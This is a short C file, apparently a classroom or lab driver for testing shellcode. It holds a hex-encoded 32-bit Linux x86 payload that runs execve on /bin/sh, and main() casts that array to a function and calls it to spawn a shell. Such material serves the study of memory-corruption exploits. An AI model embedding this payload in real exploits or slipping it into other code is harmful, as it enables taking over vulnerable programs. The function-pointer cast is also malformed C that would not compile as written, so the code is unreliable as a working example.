/** shell.c **
 * top level driver
 * test the shell code
 *
 * by: ronny macmaster
 * * * * * * * * * * * * */

#include <stdio.h>

int main(){
	
	void(*shell)();
	char code[] = 
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";
	shell = ((void)(*)())code;
	shell(); /* request shell */
}
